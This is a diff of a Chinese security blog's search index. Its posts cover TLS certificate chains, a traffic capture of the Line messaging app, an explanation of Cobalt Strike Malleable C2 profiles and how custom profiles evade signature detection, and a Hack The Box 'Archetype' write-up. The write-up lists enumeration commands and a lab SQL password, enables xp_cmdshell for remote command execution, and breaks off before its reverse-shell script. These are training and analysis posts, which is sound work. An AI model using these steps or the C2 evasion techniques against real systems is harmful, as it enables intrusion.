O=DigiCert Inc, OU=www.digicert.com, CN=DigiCert Global Root CA</span><br><span class="line">        Subject: C=US, O=DigiCert Inc, CN=DigiCert Basic RSA CN CA G2</span><br><span class="line">763:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, OU=www.digicert.com, CN=Secure Site CA G2</span><br><span class="line">        Subject: C=CN, ST=Guangdong Province, L=Shenzhen, O=Tencent Technology (Shenzhen) Company Limited, CN=flow.qq.com</span><br><span class="line">763:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, OU=www.digicert.com, CN=DigiCert Global Root CA</span><br><span class="line">        Subject: C=US, O=DigiCert Inc, OU=www.digicert.com, CN=Secure Site CA G2</span><br><span class="line">1086:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, CN=DigiCert Secure Site CN CA G3</span><br><span class="line">        Subject: C=CN, ST=Guangdong Province, L=Shenzhen, O=Shenzhen Tencent Computer Systems Company Limited, CN=api.unipay.qq.com</span><br><span class="line">1086:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, OU=www.digicert.com, CN=DigiCert Global Root CA</span><br><span class="line">        Subject: C=US, O=DigiCert Inc, CN=DigiCert Secure Site CN CA G3</span><br><span class="line">1256:</span><br><span class="line">        Issuer: C=BE, O=GlobalSign nv-sa, CN=GlobalSign RSA OV SSL CA 2018</span><br><span class="line">        Subject: C=CN, ST=\xE5\x9B\x9B\xE5\xB7\x9D\xE7\x9C\x81, L=\xE6\x88\x90\xE9\x83\xBD\xE5\xB8\x82, OU=IT Dept, O=\xE5\x9B\x9B\xE5\xB7\x9D\xE9\x80\x9F\xE5\xAE\x9D\xE7\xBD\x91\xE7\xBB\x9C\xE7\xA7\x91\xE6\x8A\x80\xE6\x9C\x89\xE9\x99\x90\xE5\x85\xAC\xE5\x8F\xB8, CN=portal.xunyou.mobi</span><br><span class="line">1256:</span><br><span class="line">        Issuer: OU=GlobalSign Root CA - R3, O=GlobalSign, CN=GlobalSign</span><br><span class="line">        Subject: C=BE, O=GlobalSign nv-sa, CN=GlobalSign RSA OV SSL CA 2018</span><br><span class="line">1256:</span><br><span class="line">        Issuer: OU=GlobalSign Root CA - R3, O=GlobalSign, CN=GlobalSign</span><br><span class="line">        Subject: OU=GlobalSign Root CA - R3, O=GlobalSign, CN=GlobalSign</span><br><span class="line">1267:</span><br><span class="line">        Issuer: C=BE, O=GlobalSign nv-sa, CN=GlobalSign RSA OV SSL CA 2018</span><br><span class="line">        Subject: C=CN, ST=\xE5\x9B\x9B\xE5\xB7\x9D\xE7\x9C\x81, L=\xE6\x88\x90\xE9\x83\xBD\xE5\xB8\x82, OU=IT Dept, O=\xE5\x9B\x9B\xE5\xB7\x9D\xE9\x80\x9F\xE5\xAE\x9D\xE7\xBD\x91\xE7\xBB\x9C\xE7\xA7\x91\xE6\x8A\x80\xE6\x9C\x89\xE9\x99\x90\xE5\x85\xAC\xE5\x8F\xB8, CN=portal.xunyou.mobi</span><br><span class="line">1267:</span><br><span class="line">        Issuer: OU=GlobalSign Root CA - R3, O=GlobalSign, CN=GlobalSign</span><br><span class="line">        Subject: C=BE, O=GlobalSign nv-sa, CN=GlobalSign RSA OV SSL CA 2018</span><br><span class="line">1267:</span><br><span class="line">        Issuer: OU=GlobalSign Root CA - R3, O=GlobalSign, CN=GlobalSign</span><br><span class="line">        Subject: OU=GlobalSign Root CA - R3, O=GlobalSign, CN=GlobalSign</span><br><span class="line">1427:</span><br><span class="line">        Issuer: C=BE, O=GlobalSign nv-sa, CN=GlobalSign RSA OV SSL CA 2018</span><br><span class="line">        Subject: C=CN, ST=\xE5\x9B\x9B\xE5\xB7\x9D\xE7\x9C\x81, L=\xE6\x88\x90\xE9\x83\xBD\xE5\xB8\x82, OU=IT Dept, O=\xE5\x9B\x9B\xE5\xB7\x9D\xE9\x80\x9F\xE5\xAE\x9D\xE7\xBD\x91\xE7\xBB\x9C\xE7\xA7\x91\xE6\x8A\x80\xE6\x9C\x89\xE9\x99\x90\xE5\x85\xAC\xE5\x8F\xB8, CN=portal.xunyou.mobi</span><br><span class="line">1427:</span><br><span class="line">        Issuer: OU=GlobalSign Root CA - R3, O=GlobalSign, CN=GlobalSign</span><br><span class="line">        Subject: C=BE, O=GlobalSign nv-sa, CN=GlobalSign RSA OV SSL CA 2018</span><br><span class="line">1427:</span><br><span class="line">        Issuer: OU=GlobalSign Root CA - R3, O=GlobalSign, CN=GlobalSign</span><br><span class="line">        Subject: OU=GlobalSign Root CA - R3, O=GlobalSign, CN=GlobalSign</span><br><span class="line">1474:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, CN=DigiCert Secure Site CN CA G3</span><br><span class="line">        Subject: C=CN, ST=Guangdong Province, L=Shenzhen, O=Shenzhen Tencent Computer Systems Company Limited, CN=api.unipay.qq.com</span><br><span class="line">1474:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, OU=www.digicert.com, CN=DigiCert Global Root CA</span><br><span class="line">        Subject: C=US, O=DigiCert Inc, CN=DigiCert Secure Site CN CA G3</span><br><span class="line">1518:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, CN=DigiCert Secure Site CN CA G3</span><br><span class="line">        Subject: C=CN, ST=Guangdong Province, L=Shenzhen, O=Shenzhen Tencent Computer Systems Company Limited, CN=api.unipay.qq.com</span><br><span class="line">1518:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, OU=www.digicert.com, CN=DigiCert Global Root CA</span><br><span class="line">        Subject: C=US, O=DigiCert Inc, CN=DigiCert Secure Site CN CA G3</span><br><span class="line">1530:</span><br><span class="line">        Issuer: C=BE, O=GlobalSign nv-sa, CN=GlobalSign Organization Validation CA - SHA256 - G2</span><br><span class="line">        Subject: C=CN, ST=guangdong, L=shenzhen, O=Tencent Technology (Shenzhen) Company Limited, CN=*.jun04.sparta.3g.qq.com</span><br><span class="line">1530:</span><br><span class="line">        Issuer: C=BE, O=GlobalSign nv-sa, OU=Root CA, CN=GlobalSign Root CA</span><br><span class="line">        Subject: C=BE, O=GlobalSign nv-sa, CN=GlobalSign Organization Validation CA - SHA256 - G2</span><br><span class="line">1530:</span><br><span class="line">        Issuer: C=BE, O=GlobalSign nv-sa, OU=Root CA, CN=GlobalSign Root CA</span><br><span class="line">        Subject: C=BE, O=GlobalSign nv-sa, OU=Root CA, CN=GlobalSign Root CA</span><br><span class="line">1713:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, CN=DigiCert Secure Site CN CA G3</span><br><span class="line">        Subject: C=CN, ST=Guangdong Province, L=Shenzhen, O=Shenzhen Tencent Computer Systems Company Limited, CN=pandora.game.qq.com</span><br><span class="line">1713:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, OU=www.digicert.com, CN=DigiCert Global Root CA</span><br><span class="line">        Subject: C=US, O=DigiCert Inc, CN=DigiCert Secure Site CN CA G3</span><br><span class="line">1976:</span><br><span class="line">        Issuer: C=BE, O=GlobalSign nv-sa, CN=GlobalSign Organization Validation CA - SHA256 - G2</span><br><span class="line">        Subject: C=CN, ST=guangdong, L=shenzhen, O=Tencent Technology (Shenzhen) Company Limited, CN=*.ingame.qq.com</span><br><span class="line">1976:</span><br><span class="line">        Issuer: C=BE, O=GlobalSign nv-sa, OU=Root CA, CN=GlobalSign Root CA</span><br><span class="line">        Subject: C=BE, O=GlobalSign nv-sa, CN=GlobalSign Organization Validation CA - SHA256 - G2</span><br><span class="line">1976:</span><br><span class="line">        Issuer: C=BE, O=GlobalSign nv-sa, OU=Root CA, CN=GlobalSign Root CA</span><br><span class="line">        Subject: C=BE, O=GlobalSign nv-sa, OU=Root CA, CN=GlobalSign Root CA</span><br><span class="line">2299:</span><br><span class="line">        Issuer: C=BE, O=GlobalSign nv-sa, CN=GlobalSign Organization Validation CA - SHA256 - G2</span><br><span class="line">        Subject: C=CN, ST=guangdong, L=shenzhen, O=Tencent Technology (Shenzhen) Company Limited, CN=*.jun04.sparta.3g.qq.com</span><br><span class="line">2299:</span><br><span class="line">        Issuer: C=BE, O=GlobalSign nv-sa, OU=Root CA, CN=GlobalSign Root CA</span><br><span class="line">        Subject: C=BE, O=GlobalSign nv-sa, CN=GlobalSign Organization Validation CA - SHA256 - G2</span><br><span class="line">2299:</span><br><span class="line">        Issuer: C=BE, O=GlobalSign nv-sa, OU=Root CA, CN=GlobalSign Root CA</span><br><span class="line">        Subject: C=BE, O=GlobalSign nv-sa, OU=Root CA, CN=GlobalSign Root CA</span><br><span class="line">2311:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, CN=DigiCert Secure Site CN CA G3</span><br><span class="line">        Subject: C=CN, ST=Guangdong Province, L=Shenzhen, O=Shenzhen Tencent Computer Systems Company Limited, CN=*.xyapi.game.qq.com</span><br><span class="line">2311:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, OU=www.digicert.com, CN=DigiCert Global Root CA</span><br><span class="line">        Subject: C=US, O=DigiCert Inc, CN=DigiCert Secure Site CN CA G3</span><br></pre></td></tr></table></figure>
+
+<h3 id="“Line”流量数据包分析"><a href="#“Line”流量数据包分析" class="headerlink" title="“Line”流量数据包分析"></a>“Line”流量数据包分析</h3><p>采集工具：Wireshark、手机型号RedMi K30 5G、TCPdump、V2ray</p>
+<h4 id="数据包收集过程-1"><a href="#数据包收集过程-1" class="headerlink" title="数据包收集过程"></a>数据包收集过程</h4><p>手机开启黑域，开启V2Ray，确保活跃应用仅为“Line”和“V2ray”，连接上电脑开启的热点。在wireshark捕获设置中找到地址为手机IP地址的网络接口，进行过滤捕获。VPS端尽量减少应用流量，开始日志并准备用TCPdump进行流量捕获。</p>
+<p>打开Line应用，记录登入过程和文字、图像发送过程，在PC端进行手机流量的捕获，同时在VPS上进行TCPdump对流量进行捕获并收集日志信息。</p>
+<p>根据收集到的Pcap文件观察可以知道，PC端捕获的流量只与VPS服务器通讯有关，VPS服务器捕获的流量与Line相关，但几乎只包含TLS协议的数据。</p>
+<h4 id="流量分析-1"><a href="#流量分析-1" class="headerlink" title="流量分析"></a>流量分析</h4><p>v2ray日志</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2021/04/11 03:13:32 223.104.39.77:39600 accepted udp:1.1.1.1:53 </span><br><span class="line">2021/04/11 03:13:33 223.104.39.77:39602 accepted tcp:23.218.94.48:443 </span><br><span class="line">2021/04/11 03:13:42 223.104.39.77:39618 accepted tcp:111.13.141.211:443 </span><br><span class="line">2021/04/11 03:13:45 223.104.39.77:39622 accepted udp:1.1.1.1:53 </span><br><span class="line">2021/04/11 03:13:46 223.104.39.77:39624 accepted tcp:47.88.232.213:443 </span><br><span class="line">2021/04/11 03:13:49 223.104.39.77:39628 accepted udp:1.1.1.1:53 </span><br><span class="line">2021/04/11 03:13:50 223.104.39.77:39630 accepted tcp:125.209.222.59:443 </span><br><span class="line">2021/04/11 03:13:52 223.104.39.77:39634 accepted udp:1.1.1.1:53 </span><br><span class="line">2021/04/11 03:13:52 223.104.39.77:39636 accepted tcp:147.92.146.179:443 </span><br><span class="line">2021/04/11 03:13:53 223.104.39.77:39640 accepted udp:1.1.1.1:53 </span><br><span class="line">2021/04/11 03:13:54 223.104.39.77:39642 accepted tcp:23.218.94.120:443 </span><br><span class="line">2021/04/11 03:13:58 223.104.39.77:39646 accepted tcp:23.218.94.120:443 </span><br><span class="line">2021/04/11 03:13:58 223.104.39.77:39648 accepted tcp:23.218.94.120:443 </span><br><span class="line">2021/04/11 03:13:58 223.104.39.77:39650 accepted tcp:23.218.94.120:443 </span><br><span class="line">2021/04/11 03:13:58 223.104.39.77:39658 accepted udp:1.1.1.1:53 </span><br><span class="line">2021/04/11 03:13:59 223.104.39.77:39660 accepted tcp:182.61.200.67:443 </span><br><span class="line">2021/04/11 03:14:17 223.104.39.77:39664 accepted tcp:147.92.146.179:443 </span><br><span class="line">2021/04/11 03:14:23 223.104.39.77:39668 accepted udp:1.1.1.1:53 </span><br><span class="line">2021/04/11 03:14:23 223.104.39.77:39670 accepted tcp:23.218.94.48:443 </span><br><span class="line">2021/04/11 03:14:27 223.104.39.77:39674 accepted udp:1.1.1.1:53 </span><br><span class="line">2021/04/11 03:14:28 223.104.39.77:39676 accepted udp:1.1.1.1:53 </span><br><span class="line">2021/04/11 03:14:28 tcp:223.104.39.77:39678 accepted udp:147.92.147.68:21815 </span><br><span class="line">2021/04/11 03:14:28 223.104.39.77:39680 accepted tcp:47.74.174.54:443 </span><br><span class="line">2021/04/11 03:14:28 223.104.39.77:39684 accepted tcp:13.227.60.124:443 </span><br><span class="line">2021/04/11 03:14:28 223.104.39.77:39686 accepted tcp:13.227.60.124:443 </span><br><span class="line">2021/04/11 03:14:47 tcp:223.104.39.77:39692 accepted udp:147.92.147.68:21815 </span><br><span class="line">2021/04/11 03:14:49 223.104.39.77:39694 accepted tcp:147.92.146.179:443 </span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>23.218.94.48，爱尔兰 Dublin 阿卡迈，提供CDN服务</li>
+<li>47.88.232.213，新加坡阿里云</li>
+<li>125.209.222.59，韩国</li>
+<li>147.92.146.179，日本东京，Line公司服务器</li>
+<li>182.61.200.67，北京</li>
+<li>23.218.94.48，爱尔兰</li>
+<li>13.227.60.124，美国亚马逊</li>
+<li>147.92.147.68，日本东京，Line公司服务器</li>
+</ol>
+<p>根据日志可以获得整个连接过程中与服务器互动得到的IP地址和端口，以及TCP\UDP协议</p>
+<p>在wireshark中根据DNS协议，可以获取相应的域名信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">33：data.mistat.xiaomi.com</span><br><span class="line">34：data.mistat.xiaomi.com</span><br><span class="line">164：uts-front.line-apps.com</span><br><span class="line">167：gxx.line.naver.jp</span><br><span class="line">169：uts-front.line-apps.com</span><br><span class="line">171：gxx.line.naver.jp</span><br><span class="line">212：cix.line-apps.com</span><br><span class="line">215：cix.line-apps.com</span><br><span class="line">224：ga2w.line.naver.jp</span><br><span class="line">235：ga2w.line.naver.jp</span><br></pre></td></tr></table></figure>
+
+<p>根据相应的时间和我执行的操作匹配来看，应该是文字和图片发送到Keep备忘录行为所导致的域名解析过程</p>
+<p>因为VPS流量不可读原因，我查询了一下Line消息传递的实现过程</p>
+<p><img src="/%5Cimages%5C02-Current-implementation-of-LINE-message-delivery.png"></p>
+<p>Line在应用程序中包含一个可以加密消息的公共秘钥，然后创建一个安全加密通道，该通道只有在用户设备与服务器连接时才能由Line Server解密。</p>
+<p>这样的加密方式更加轻量级且消除了中间人攻击的可能性，这也是VPS无法读取相应数据的主要原因。</p>
+<p>Line还使用Letter Sealing对消息进行封信操作。</p>
+<p><img src="/%5Cimages%5C06-Process-of-Letter-Sealing.png"></p>
+<p>其封信过程如上图所示。</p>
+<p>LINE使用ECDH方法创建一个256位（32字节）共享值，然后将其用于创建加密密钥。密钥数据也与加密的消息一起传输，但是仅加密消息并不能使其完全安全。虽然看不到实际的消息，但有可能使消息不可读或更改内容。</p>
+<p>两者结合之后的消息传递流程如下</p>
+<p><img src="/%5Cimages%5C07-Message-delivery-in-Letter-Sealing.png"></p>
+]]></content>
+      <categories>
+        <category>Traffic Analysis</category>
+      </categories>
+      <tags>
+        <tag>course</tag>
+        <tag>Study life</tag>
+        <tag>Traffic Analysis</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CobaltStrike配置文件详解</title>
+    <url>/2022/09/14/CobaltStrike%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h1 id="CobaltStrike配置文件详解"><a href="#CobaltStrike配置文件详解" class="headerlink" title="CobaltStrike配置文件详解"></a>CobaltStrike配置文件详解</h1><p>Cobalt Strike使用配置文件中存在的值来生成beacon payload，用户创建配置文件，并使用可扩展命令和C2配置文件语言来设置值。配置文件指定beacon将如何在事件中改变和存储数据。</p>
+<p>在配置文件中，选项分为全局选项和局部选项。全局选项更新全局 Beacon 设置，而本地选项是特定于事件的。一个事件中的本地选项更改不会影响其他事件的输出。</p>
+<p>配置文件分为多个部分，规定 C2 通信不同部分的值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># this is a comment</span><br><span class="line">set global_option &quot;value&quot;;</span><br><span class="line"> </span><br><span class="line">protocol-transaction &#123;</span><br><span class="line">     set local_option &quot;value&quot;;</span><br><span class="line"> </span><br><span class="line">     client &#123;</span><br><span class="line">          # customize client indicators</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     server &#123;</span><br><span class="line">          # customize server indicators</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h2><p>全局选项对于 C2 通信来说是全局的。睡眠时间和时间抖动等选项定义了 Beacon 与团队服务器通信的频率。以下是一些带有示例值的全局选项的列表：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set sample_name &quot;Profile Name&quot;;</span><br><span class="line">set sleeptime &quot;30000&quot;;</span><br><span class="line">set jitter    &quot;20&quot;;</span><br><span class="line">set useragent &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36&quot;;</span><br><span class="line">set host_stage &quot;false&quot;;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_profile-language.htm#_Toc65482842">Cobalt Strike 用户指南</a></p>
+</blockquote>
+<h2 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h2><p>另一方面，本地选项的范围仅限于每个事件。一项事件的选项不会影响另一项事件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set uri &quot;URI_For HTTP transaction&quot;;</span><br><span class="line">set verb &quot;POST&quot;;</span><br><span class="line">set uri_x86 &quot;StagetURI_for_x86&quot;;</span><br><span class="line">set uri_x64 &quot;StagetURI_for_x64&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>除了这些选项之外，配置文件还可以指定不同的协议来执行不同的操作。以下是示例以及对其用法的简要说明：</p>
+<ul>
+<li><p>http-stager: Beacon 是一个分阶段的有效负载。stager 下载文件并将其注入内存。此事件中列出的值正在自定义用于下载信标的 HTTP 通信。</p>
+</li>
+<li><p>dns-beacon: 在 Cobalt Strike v4.3 之后，DNS 选项成为dns-beacon事件的一部分。此事件修改 DNS C2 通信。</p>
+<blockquote>
+<p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_dns-beacons.htm#_Toc65482850">Cobalt Strike 用户指南</a>。</p>
+</blockquote>
+</li>
+<li><p>http-get： http -get事件自定义 Beacon 和团队服务器之间的 HTTP 通信。Beacon 首先发送 HTTP 请求，其中包含有关受感染系统的元数据。如果团队服务器有任务要执行，服务器会发送一个 HTTP 响应。</p>
+</li>
+<li><p>http**-**post：一旦 Beacon 执行服务器发送的任务，任务的输出就会在http-post事件中传输。当任务输出发送到服务器时，此事件中列出的值会影响 HTTP 通信。</p>
+</li>
+<li><p>https-certificate：如果 Beacon 的任务是通过 HTTPS 进行通信，则团队服务器会生成一个自签名证书。团队服务器使用http-get和http-post事件值来创建实际的 HTTP 请求和响应。此配置文件事件可以帮助指定 SSL 证书的不同参数。</p>
+<blockquote>
+<p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_self-signed-ssl-certificates.htm#_Toc65482846">Cobalt Strike 用户指南。</a></p>
+</blockquote>
+</li>
+</ul>
+<p><img src="/%5Cimages%5Cword-image-32.png" alt="图 1. Cobalt Strike 默认配置文件"></p>
+<p>图 1. Cobalt Strike 默认配置文件</p>
+<h2 id="Cobalt-Strike-默认配置文件"><a href="#Cobalt-Strike-默认配置文件" class="headerlink" title="Cobalt Strike 默认配置文件"></a>Cobalt Strike 默认配置文件</h2><p>如果未指定其他自定义配置文件，则将加载默认配置文件。上面的图 1 是默认配置文件的规范，下面的图 2 是使用 Cobalt Strike 团队服务器中的网络驱动下载选项从默认配置文件捕获流量的示例。</p>
+<p><img src="/%5Cimages%5Cword-image-33.png" alt="图 2. 从默认配置文件中捕获的示例流量"></p>
+<p>从图 2 中，您可以看到有几个 GET 和 POST 请求和响应的 HTTP 事务。</p>
+<ul>
+<li>对于 GET 请求，大多数请求 URI 都非常短并且具有预定义的模式。URI 是从图 1 中默认配置文件的set uri下指定的 URI 列表中随机选择的（完整列表请参见下表 1）。如果恶意攻击者使用在http-get部分中设置 uri选项的自定义配置文件，他们可以轻松地将 URI 修改为任意字符串。这也解释了为什么基于模式的签名可以很好地使用默认配置文件捕获 Cobalt Strike 流量，但无法使用自定义配置文件捕获任何变化。</li>
+<li>对于 POST 请求，URI 中有一个预定义的模式 - &#x2F;submit.php?id&#x3D;。ID 值是随机生成的。与 HTTP GET 请求的可能性类似，如果恶意攻击者在http-post部分使用带有set uri选项的自定义配置文件，他们可以轻松地将 URI 修改为任意字符串。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Index</th>
+<th>URIs</th>
+<th>Index</th>
+<th>URIs</th>
+<th>Index</th>
+<th>URIs</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>&#x2F;ca</td>
+<td>8</td>
+<td>&#x2F;fwlink</td>
+<td>15</td>
+<td>&#x2F;push</td>
+</tr>
+<tr>
+<td>2</td>
+<td>&#x2F;dpixel</td>
+<td>9</td>
+<td>&#x2F;cm</td>
+<td>16</td>
+<td>&#x2F;ptj</td>
+</tr>
+<tr>
+<td>3</td>
+<td>&#x2F;__utm.gif</td>
+<td>10</td>
+<td>&#x2F;cx</td>
+<td>17</td>
+<td>&#x2F;j.ad</td>
+</tr>
+<tr>
+<td>4</td>
+<td>&#x2F;pixel.gif</td>
+<td>11</td>
+<td>&#x2F;pixel</td>
+<td>18</td>
+<td>&#x2F;ga.js</td>
+</tr>
+<tr>
+<td>5</td>
+<td>&#x2F;g.pixel</td>
+<td>12</td>
+<td>&#x2F;match</td>
+<td>19</td>
+<td>&#x2F;en_US&#x2F;all.js</td>
+</tr>
+<tr>
+<td>6</td>
+<td>&#x2F;dot.gif</td>
+<td>13</td>
+<td>&#x2F;visit.js</td>
+<td>20</td>
+<td>&#x2F;activity</td>
+</tr>
+<tr>
+<td>7</td>
+<td>&#x2F;updates.rss</td>
+<td>14</td>
+<td>&#x2F;load</td>
+<td>21</td>
+<td>&#x2F;IE9CompatViewList.xml</td>
+</tr>
+</tbody></table>
+<p>表 1. Cobalt Strike 默认配置文件中指定的可能 URI</p>
+<h2 id="定制的-Cobalt-Strike-Profile"><a href="#定制的-Cobalt-Strike-Profile" class="headerlink" title="定制的 Cobalt Strike Profile"></a>定制的 Cobalt Strike Profile</h2><p>Public Malleable C2 配置文件可以在公共存储库中下载，例如<a href="https://github.com/rsmudge/Malleable-C2-Profiles">GitHub </a>的官方配置文件示例。这些配置文件可以由团队服务器加载并用作 C2 通信的信标下载。</p>
+<h3 id="全局选项"><a href="#全局选项" class="headerlink" title="全局选项"></a>全局选项</h3><ul>
+<li>sleeptime：信标响应的睡眠时间为 5000 毫秒 (5s)。</li>
+<li>Jitter：设置%的时间抖动为0。在本例中，由于jitter值为0，Beacon会每隔5s回调一次。</li>
+<li>Maxdns：通过 DNS 上传数据时，主机名的最大长度为 255。</li>
+<li>UserAgent：将 HTTP C2请求用户代理设置为”Mozilla&#x2F;5.0(compatible; MSIE 8.0;Windows NT 6.1;Trident&#x2F;5.0)”</li>
+</ul>
+<p><img src="/%5Cimages%5Cword-image-34.png" alt="图 3. Etumbot 配置文件中的全局选项"></p>
+<h3 id="信标通过-HTTP-GET-请求从-teamserver获取任务"><a href="#信标通过-HTTP-GET-请求从-teamserver获取任务" class="headerlink" title="信标通过 HTTP GET 请求从 teamserver获取任务"></a>信标通过 HTTP GET 请求从 teamserver获取任务</h3><p>在全局选项下方，我们可以找到以下关于 HTTP 请求和响应的选项配置。下面的图 4 和图 5 显示了这种配置，其中包括客户端和服务器的 URI、标头和元数据信息。</p>
+<p>红色框突出显示了示例 Malleable C2 配置文件中的 HTTP 请求 URI、HTTP 请求标头、元数据编码算法、URI 中附加的元数据、HTTP 响应标头、加密和编码为响应正文的任务数据。</p>
+<p><img src="/%5Cimages%5Cword-image-35.png" alt="图 4. Etumbot 配置文件中的 HTTP GET 请求选项"></p>
+<p><img src="/%5Cimages%5Cword-image-36.png" alt="图 5. 实时流量中的 HTTP GET 请求"></p>
+<h3 id="Beacon-通过-HTTP-POST-请求将任务执行结果提交到-teamserver"><a href="#Beacon-通过-HTTP-POST-请求将任务执行结果提交到-teamserver" class="headerlink" title="Beacon 通过 HTTP POST 请求将任务执行结果提交到 teamserver"></a>Beacon 通过 HTTP POST 请求将任务执行结果提交到 teamserver</h3><p>我们可以从下面的图 6 中找到以下关于 HTTP 响应的选项配置，以及图 7 中 POST C2 流量的样子。</p>
+<p>红色框突出显示了示例可扩展 C2 配置文件中的 HTTP 请求 URI、HTTP 请求标头、附加在 URI 中的 HTTP 请求 sessionID、用于命令执行结果的 HTTP 请求有效负载、HTTP 响应标头和 HTTP 响应正文。</p>
+<p><img src="/%5Cimages%5Cword-image-37.png" alt="图 6. Etumbot 配置文件中的 HTTP POST 请求选项"></p>
+<p>红色框突出显示了可扩展 C2 配置文件示例中的 HTTP URI 路径、Netbios 编码的会话 ID、HTTP URI 路径后缀、HTTP 请求标头、HTTP 请求 UA、Base64 编码的任务执行结果和 HTTP 响应标头。<img src="/%5Cimages%5Cword-image-38.png" alt="图 7. 实时流量中的 HTTP POST 请求选项"></p>
+]]></content>
+      <categories>
+        <category>Traffic Analysis</category>
+      </categories>
+      <tags>
+        <tag>Study life</tag>
+        <tag>Traffic Analysis</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB-Archetype WriteUp</title>
+    <url>/2021/04/13/HTB-Archetype%20WriteUp/</url>
+    <content><![CDATA[<h2 id="HTB-Archetype-WriteUp"><a href="#HTB-Archetype-WriteUp" class="headerlink" title="HTB-Archetype WriteUp"></a>HTB-Archetype WriteUp</h2><h3 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h3><p><code>nmap -sV -sC 10.10.10.27</code></p>
+<img src="/images/20210313210153.png" style="zoom:67%;" />
+
+<p>根据上图扫描结果，靶机开放了135、139、445、1433端口</p>
+<ul>
+<li><p>135端口为RPC，可以进行口令爆破</p>
+</li>
+<li><p>139端口为NetBIOS</p>
+</li>
+<li><p>445端口为SMB文件共享</p>
+</li>
+<li><p>1433端口与SQL服务有关</p>
+</li>
+</ul>
+<h3 id="445端口SMB文件共享"><a href="#445端口SMB文件共享" class="headerlink" title="445端口SMB文件共享"></a>445端口SMB文件共享</h3><p>先查看SMB的共享文件</p>
+<p><code>smbclient -L 10.10.10.27</code></p>
+<img src="/images/20210313204721.png" style="zoom:67%;" />
+
+<p>smb要求输入密码，但是直接按回车之后，也可以看到共享列表</p>
+<p>在图中可以看到backups为共享的对象为全体，直接访问backups文件夹</p>
+<p><code>smbclient //10.10.10.27/backups</code></p>
+<p>回车</p>
+<p>然后用<code>ls</code>查看backups文件内容</p>
+<p>用<code>get</code>获取prod.dtsConfig文件</p>
+<img src="/images/20210313205904.png" style="zoom: 67%;" />
+
+<p>prod.dtsConfig文件就下载到了我们服务器中</p>
+<img src="/images/20210313212722.png" style="zoom:67%;" />
+
+<p>在prod.dtsConfig文件中，可以找sql的User ID和Password</p>
+<p>SQL Server的身份验证方式有两种：操作系统身份验证和数据库身份验证</p>
+<p>这里的参数值是操作系统身份验证方式，ARCHETYPE为主机名，sql_svc为登录数据库的操作系统用户名</p>
+<h3 id="mssqlclient登入数据库执行脚本"><a href="#mssqlclient登入数据库执行脚本" class="headerlink" title="mssqlclient登入数据库执行脚本"></a>mssqlclient登入数据库执行脚本</h3><p>这边需要下载impacket工具</p>
+<p><code>git clone https://github.com/SecureAuthCorp/impacket</code></p>
+<p><code>cd impacket</code></p>
+<p><code>python3 setup.py install</code></p>
+<p>然后利用mssqlclient和获取到的账号密码登入数据库</p>
+<p><code>mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code></p>
+<p><code>M3g4c0rp123</code></p>
+<img src="/images/Lily_Screenshot_1615812452.png" style="zoom:67%;" />
+
+<p>登入成功之后，我们需要测试一下该账号是否具有最高的sysadmin权限</p>
+<p><code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code></p>
+<img src="/images/image-20210315205958962.png" style="zoom: 67%;" />
+
+<p>结果显示，该账号确实具有sysadmin的权限，接下来启用xp_cmdshell获得RCE并反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;Show Advanced Options&#x27;, 1; </span><br><span class="line">reconfigure; </span><br><span class="line">sp_configure;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">xp_cmdshell &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p>其中执行whoami的结果显示如下</p>
+<img src="/images/image-20210315213821244.png" style="zoom:67%;" />
+
+<p>说明该账户在SQL服务中具有archetype\sql_svc，但是在host上不具有任何权限</p>
+<p>创建一个shell.ps1脚本，内容如下</p>
